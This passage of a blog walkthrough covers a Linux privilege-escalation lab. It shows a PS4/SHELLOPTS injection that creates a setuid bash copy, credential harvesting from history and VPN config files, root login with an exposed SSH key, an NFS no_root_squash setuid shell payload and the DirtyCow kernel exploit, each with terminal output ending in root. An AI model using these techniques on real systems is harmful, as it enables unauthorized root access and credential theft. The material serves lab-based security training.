+Starting web server: apache2httpd (pid 1333) already running</code></pre><p id="7d1e8ee0-8a14-48a8-8520-8222fdc72c6e" class="">
+</p><p id="1ad582e7-e5e7-4c8c-b917-63ac6939e7bd" class="">When in debugging mode, Bash uses the environment variable <strong>PS4</strong> to display an extra prompt for debugging statements.</p><p id="709f7eea-43a8-48eb-8309-7bf0fcb51878" class="">
+</p><p id="b26a5659-3cf0-4cf0-8164-ced61ea29200" class="">Run the /tmp/atombash  executable with -p to gain a shell running with root privileges:</p><p id="9a8c9a48-004e-4a76-a7cb-332182eaddaf" class="">
+</p><pre id="0181a177-573e-439c-9f60-894e4dac4af0" class="code"><code>user@debian:~$ env -i SHELLOPTS=xtrace PS4=&#x27;$(cp /bin/bash /tmp/atombash; chmod +xs /tmp/atombash)&#x27; /usr/local/bin/suid-env2                                                                                  
+/usr/sbin/service apache2 start
+basename /usr/sbin/service
+VERSION=&#x27;service ver. 0.91-ubuntu1&#x27;
+basename /usr/sbin/service
+USAGE=&#x27;Usage: service &lt; option &gt; | --status-all | [ service_name [ command | --full-restart ] ]&#x27;
+SERVICE=
+ACTION=
+SERVICEDIR=/etc/init.d
+OPTIONS=
+&#x27;[&#x27; 2 -eq 0 &#x27;]&#x27;
+cd /
+&#x27;[&#x27; 2 -gt 0 &#x27;]&#x27;
+case &quot;${1}&quot; in
+&#x27;[&#x27; -z &#x27;&#x27; -a 2 -eq 1 -a apache2 = --status-all &#x27;]&#x27;
+&#x27;[&#x27; 2 -eq 2 -a start = --full-restart &#x27;]&#x27;
+&#x27;[&#x27; -z &#x27;&#x27; &#x27;]&#x27;
+SERVICE=apache2
+shift
+&#x27;[&#x27; 1 -gt 0 &#x27;]&#x27;
+case &quot;${1}&quot; in
+&#x27;[&#x27; -z apache2 -a 1 -eq 1 -a start = --status-all &#x27;]&#x27;
+&#x27;[&#x27; 1 -eq 2 -a &#x27;&#x27; = --full-restart &#x27;]&#x27;
+&#x27;[&#x27; -z apache2 &#x27;]&#x27;
+&#x27;[&#x27; -z &#x27;&#x27; &#x27;]&#x27;
+ACTION=start
+shift
+&#x27;[&#x27; 0 -gt 0 &#x27;]&#x27;
+&#x27;[&#x27; -r /etc/init/apache2.conf &#x27;]&#x27;
+&#x27;[&#x27; -x /etc/init.d/apache2 &#x27;]&#x27;
+exec env -i LANG= PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin TERM=dumb /etc/init.d/apache2 start                                                                                       
+Starting web server: apache2httpd (pid 1333) already running
+.
+user@debian:~$ /tmp/atombash
+atombash-4.1$ whoami
+user
+atombash-4.1$ su user
+Password:
+user@debian:~$ /tmp/atombash -p
+atombash-4.1# whoami
+root
+atombash-4.1# 
+                                                                                                                                                                 &quot;mx&quot; 00:20 23-Oct-20</code></pre><p id="1713b738-a6d9-42b1-9765-f49d38d5d5ea" class="">
+</p><p id="eb287a31-a9d7-462e-adfd-18cebe82ab3d" class="">
+</p><h3 id="43928570-8a77-4166-beec-12e5a7612b63" class=""><mark class="highlight-teal">Task 16 Passwords &amp; Keys - History Files</mark></h3><p id="1729cbff-48c4-4f9a-9861-e8f967b5a38e" class="">
+</p><p id="e6a5d0a6-831c-4995-96e7-bc02f97de608" class="">If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.hisView the contents of all the hidden history files in the user&#x27;s home directory:</p><pre id="732dfbb2-c9e2-4b82-92d9-20ea77639529" class="code"><code> user@debian:~$ history
+    1  ls -al
+    2  cat .bash_history 
+    3  ls -al
+    4  mysql -h somehost.local -uroot -ppassword123      &lt;---------------Note
+    5  exit
+    6  cd /tmp
+    7  clear
+    8  ifconfig
+    9  netstat -antp
+   10  nano myvpn.ovpn 
+   11  ls
+   12  cd
+   13  cat ~/.*history | less
+   14  cat /.*history | less
+   15  history</code></pre><p id="52d1fd5b-04fe-449f-93c3-a3499393eb8d" class="">Note that the user has tried to connect to a MySQL server at some point, using the &quot;root&quot; username and a password submitted via the command line. Note that there is no space between the -p option and the password! Switch to the root user, using the password:</p><p id="5642d16f-0cae-44bd-9709-146d4b9d5624" class=""><code>su root</code></p><p id="7f869da3-63f3-4a84-a182-b24de61b28d5" class="">we can able to see username and password </p><p id="fd319ea7-5424-4a2d-8d8a-eebd2bd1b595" class="">
+</p><h3 id="58472c64-c1c9-42b7-a233-1b1099f3c837" class=""><mark class="highlight-teal">Task 17 Passwords &amp; Keys - Config Files</mark></h3><p id="83d5b4a9-dafb-47ba-9ec9-562e42a55aca" class="">
+</p><p id="80e1b81e-f49f-4da4-af7a-4373ea62e340" class="">Config files often contain passwords in plaintext or other reversible formats. List the contents of the user&#x27;s home directory:</p><p id="be42cc5e-b27f-4593-ad2d-50435ea6ca21" class=""><code>ls /home/user</code></p><p id="aefd6813-e035-41b4-b4ad-30a048b76705" class="">Note the presence of a <strong>myvpn.ovpn</strong> config file. View the contents of the file:</p><p id="f0e28840-95a4-4cba-bf84-499a71f23aa0" class=""><code>cat /home/user/myvpn.ovpn</code></p><pre id="4bf50a2b-8d29-43e2-8185-edf20ebe9827" class="code"><code>user@debian:~$ ls
+myvpn.ovpn  tools
+user@debian:~$ cat myvpn.ovpn 
+client
+dev tun
+proto udp
+remote 10.10.10.10 1194
+resolv-retry infinite
+nobind
+persist-key
+persist-tun
+ca ca.crt
+tls-client
+remote-cert-tls server
+auth-user-pass /etc/openvpn/auth.txt  &lt;----------looks somthing intresting
+comp-lzo
+verb 1
+reneg-sec 0
+    
+user@debian:~$ cat /etc/openvpn/auth.txt 
+root
+password123</code></pre><p id="aff1aa91-8182-4fac-8e41-992e539eab4f" class="">The file should contain a reference to another location where the root user&#x27;s credentials can be found. Switch to the root user, using the credentials:</p><p id="510f0d3a-117f-4f6c-b52d-903e260910fc" class=""><code>su root</code></p><p id="773acdae-32c7-4627-a65b-bf8f7511bf93" class="">
+</p><p id="cb7cae90-d50f-463e-ac31-bbcb35f4b77e" class=""><mark class="highlight-teal">Task 18 Passwords &amp; Keys - SSH Keys</mark></p><p id="7f30d5cc-ba16-41de-8f73-bab79de91794" class="">
+</p><p id="02ad6908-9123-4354-b50a-c74570ce6029" class="">Sometimes users make backups of important files but fail to secure them with the correct permissions.</p><p id="ed10b26e-a1d2-4a6d-a324-200835750041" class="">Look for hidden files &amp; directories in the system root:</p><p id="b936280e-3ed8-4df5-8d36-2dfe06d1772c" class=""><code>ls -la /</code></p><p id="528828f0-336e-4453-91f4-1650c73cbdcb" class="">Note that there appears to be a hidden directory called <strong>.ssh</strong>. View the contents of the directory:</p><p id="1343a7d7-8a35-4ad8-936b-1824b0423b3e" class=""><code>ls -l /.ssh</code></p><p id="e047854a-e2cd-438c-8436-0651185401a7" class="">Note that there is a world-readable file called <strong>root_key</strong>. Further inspection of this file should indicate it is a private SSH
+key. The name of the file suggests it is for the root user.</p><p id="4199e5dc-8627-4a64-ba97-edd9c44e1c4a" class="">Copy the key over to your Kali box (it&#x27;s easier to just view the contents of the <strong>root_key</strong> file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:</p><p id="9e57e24e-b835-470f-9c8d-4d3d22161199" class=""><code>chmod 600 root_key</code></p><p id="87117f6c-8fd7-4db6-814f-b74f29195404" class="">Use the key to login to the Debian VM as the root account (change the IP accordingly):</p><p id="14ba0196-e0de-415a-92cb-45bf61428197" class=""><code>ssh -i root_key root@vmip</code>  </p><pre id="110e55dd-8f3e-4c80-b8a3-27daef7c3b2a" class="code"><code>$ sudo vim root_key
+atom@mx:/
+$ ssh -i root_key [root@10.10.75.251](mailto:root@10.10.75.251)
+Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 25 14:02:49 2019 from 192.168.1.2
+root@debian:~#</code></pre><p id="13f4c293-1695-4990-96fd-70d05fef4ef6" class="">
+</p><h3 id="efa232e2-dc4b-45dd-a1f9-c6eab8a7b37f" class=""><mark class="highlight-teal">Task 19 NFS</mark></h3><p id="126b87c3-e3e5-4255-a83c-b580ec557237" class="">
+</p><p id="01eb20fe-8039-4cd4-9d85-5caf001b1ce1" class="">NFS (Network File System) is a popular distributed file system.NFS shares are configured in the /etc/exports file. Remote users can mount shares, access, create, modify files. bydefault, created files inherit the remote user’s id and group id (as owner and group respectively), even if they don’t exist on the NFS server.</p><p id="e108ead7-094d-4e90-8915-1c03a451bd7f" class="">
+</p><h3 id="c54f3ac6-82cd-4b1f-991d-ba2b4908a1f0" class="">Root Squashing</h3><p id="d5c28bc9-ebd5-4633-8902-19c49d319922" class="">Root Squashing is how NFS prevents an obvious privilege escalation.If the remote user is (or claims to be) root (uid=0), NFS will instead “squash” the user and treat them as if they are the “nobody” user, in the “nogroup” group.While this behavior is default, it can be disabled!</p><p id="bb945ab7-35a8-4833-9c72-ddf91c002d75" class="">By default, NFS shares change the root user to the <code><strong>nfsnobody</strong></code> user, an unprivileged user account. This changes the owner of all root-created files to <code><strong>nfsnobody</strong></code>, which prevents uploading of programs with the setuid bit set.</p><p id="a4b552a8-57b9-4120-bd0c-60f3b3919c19" class="">
+</p><h3 id="a4ea4068-fb16-4c98-aa18-0bfc98880510" class="">no_root_squash</h3><p id="b2181a19-262d-4bb2-928a-84ed28dc74c6" class="">no_root_squashis an NFS configuration option which turns root squashing off.When included in a writable share configuration, a remote user who identifies as “root” can create files on the NFS share as the local root user. If <code><strong>no_root_squash</strong></code> is used, remote root users are able to change any file on the shared file system and leave applications infected by Trojans for other users to inadvertently execute</p><p id="78d4b010-bfc2-43cf-8ce1-6317f47358f7" class="">
+</p><p id="dd70f6fd-af5c-46f0-a0ea-5ae89b61b7f0" class="">Useful Commands </p><p id="b41a82fe-e9f4-44a1-9dcd-d4d089c6d11f" class="">Show the NFS server’s export list: </p><p id="47fb010d-e332-4c98-9ee2-3b28c93d96ad" class=""><code>$ showmount-e &lt;target&gt;</code></p><p id="8d33aed4-f988-41d2-8804-0cb439e06820" class="">Similar Nmap script:</p><p id="1ca650c8-21f9-4cb6-a2b9-ac8f89d875bd" class=""><code>$ nmap–sV–script=nfs-showmount&lt;target&gt;</code></p><p id="a2ec8a92-cd40-4820-a05d-d1d904a102d5" class="">Mount an NFS share:</p><p id="aff5ab96-c73c-4eaf-bb53-d799b57307cf" class=""><code>$ mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt;</code></p><p id="04ad56f8-b55d-4f38-9bc3-f8cab02f852b" class="">
+</p><ol id="506034ee-f5ae-4fc7-92d2-7accfd274bf2" class="numbered-list" start="1"><li>Check the contents of /etc/exports for shares with the no_root_squash option:</li></ol><pre id="fcee6b30-f23d-4454-a01e-4149985b4fa3" class="code"><code>user@debian:~$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+
+/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)      &lt;-----------------no root squash
+
+#/tmp *(rw,sync,insecure,no_subtree_check)</code></pre><p id="09a0a200-7988-4863-9076-c5abf67b1502" class="">2.Confirm that the NFS share is available for remote mounting:</p><pre id="05c5a9c4-51c4-4be2-b3f0-b3996a729756" class="code"><code>user@debian:~$ showmount -e 10.10.18.92
+Export list for 10.10.18.92:
+/tmp *</code></pre><p id="1b430d5a-aa60-4c72-88b9-f7f1c8821ecc" class="">3.Create a mount point on your local machine and mount the /tmpNFS share:</p><pre id="53b96128-9792-4729-aab5-2c8ff87d9fd6" class="code"><code>$ mkdir /tmp/atommount
+$ su root
+Password: 
+root@mx:/home/atom# ls /tmp
+atommount           Temp-1ff59a02-7d93-4d95-9f04-1c823171691e  tumblerd-watcher.log
+pulse-PKdhtXMmr18n  Temp-216da90a-4db3-49c6-a8ff-c53434398c2f  usb-unmounter-atom-lockfile
+ssh-dDVPij24mHP5    tmux-1000
+root@mx:/home/atom# mount -o rw,vers=2 10.10.18.92:/tmp /tmp/atommount</code></pre><p id="111dafba-90c6-475f-b5d7-7803237f124e" class="">4.Using the root user on your local machine, create a  payload and save it to the mounted share:</p><pre id="6ddd4ba0-e281-4d7a-bff4-c338a72daec8" class="code"><code>root@mx:/home/atom# mount -o rw,vers=2 10.10.18.92:/tmp /tmp/atommount
+root@mx:/home/atom# echo &#x27;int main() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; }&#x27; &gt; /tmp/atommount/atom.c                                                                                        
+root@mx:/home/atom# ls /tmp/atommount/
+atom.c  atommount  backup.tar.gz  useless
+root@mx:/home/atom# gcc /tmp/atommount/atom.c -o /tmp/atommount/atom
+root@mx:/home/atom# chmod +s /tmp/atommount/atom
+
+user@debian:/tmp/atommount$ ls
+user@debian:/tmp/atommount$ cd ..
+user@debian:/tmp$ ls
+atom  atom.c  atommount  backup.tar.gz  useless
+user@debian:/tmp$ ./atom
+root@debian:/tmp#</code></pre><p id="732652a7-f768-4864-86ea-977bc8b2ab99" class="">
+</p><h3 id="17b21423-5757-4c29-ba29-d5bcf32bfb28" class=""><mark class="highlight-teal">Task 20 Kernel Exploits</mark></h3><p id="37317281-8cb9-44f5-a988-ca8d7b3af958" class="">
+</p><p id="256200d5-981d-4395-a2cc-e688ff8e920b" class="">In command prompt type:</p><p id="ec4e7da8-3044-4031-abb3-885c1b2520f8" class=""><code>/home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl</code></p><pre id="fca2e0ff-5d50-46d4-a096-d60067824312" class="code"><code>user@debian:~/tools/kernel-exploits/linux-exploit-suggester-2$ ./linux-exploit-suggester-2.pl
+
+  #############################
+    Linux Exploit Suggester 2
+  #############################
+
+  Local Kernel: 2.6.32
+  Searching 72 exploits...
+
+  Possible Exploits
+  [1] american-sign-language
+      CVE-2010-4347
+      Source: http://www.securityfocus.com/bid/45408
+  [2] can_bcm
+      CVE-2010-2959
+      Source: http://www.exploit-db.com/exploits/14814
+  [3] dirty_cow                                             &lt;-------most popular keploit 
+      CVE-2016-5195
+      Source: http://www.exploit-db.com/exploits/40616</code></pre><p id="68c5e009-cf0c-47f8-a396-580dad75978c" class="">From the output, notice that the OS is vulnerable to “dirtycow”.</p><p id="06fba10d-194d-4f8d-bfdb-0eb8b1156767" class="">
+</p><p id="8b153713-95e3-4bff-aedc-4e1cc2527ed2" class="">In command prompt type:</p><p id="0d03d5d3-f7b4-41dc-b6d9-c6828a7ef4aa" class=""><code>gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w</code></p><p id="507ddcae-d5af-411e-b308-bc886130c8b0" class="">In command prompt type: <code>./c0w</code></p><p id="c2b698ca-ddf3-423a-93a3-c207980ad844" class="">
+</p><p id="601a24e1-6d15-4f5c-9f89-69cc8b7015a6" class=""><mark class="highlight-red">This part takes 1-2 minutes - Please allow it some time to work.</mark></p><p id="6c388f34-c00b-449d-9002-356b622abc02" class="">In command prompt type: <code>passwd</code></p><pre id="8cc099e3-31f2-462f-b871-4b849e9cd550" class="code"><code>user@debian:~$ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+user@debian:~$ ./c0w
+
+   (___)
+   (o o)_____/
+    @@ `     \
+     \ ____, //usr/bin/passwd
+     //    //
+    ^^    ^^
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd to /tmp/bak
+mmap 72311000
+
+user@debian:~$ passwd
+root@debian:/home/user#
+root@debian:/home/user# id
+uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)                                                                                             
+root@debian:/home/user#</code></pre><p id="2cf9619e-0540-4f43-b42c-571159d082f3" class="">
+</p><h3 id="011f1e32-cc31-49ea-9289-58f5ecbbce03" class=""><mark class="highlight-teal">Task 21 Privilege Escalation Scripts</mark></h3><p id="15cd940d-e3a7-4c7e-b624-0ba5c22f26da" class="">Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory:<code> /home/user/tools/privesc-scripts</code></p></div></article>
+
+
+
+
+
+
+
+
+
+</div>
+  
+    
+  </div>
+  
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
+  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">atomloop | blog</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span style="font-size: 0.85em;">© 2020 atomloop</span>
+        
+      
+      </div>
+    
+  </div>
+</footer>
+
+<script src="https://atomloop.github.io/assets/main.js"></script>
+<script src="https://atomloop.github.io/assets/prism.js"></script>
+
+
+
+
+  
+  
+  
+  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
+  
+</div>
+
+
+
+</body>
+</html>
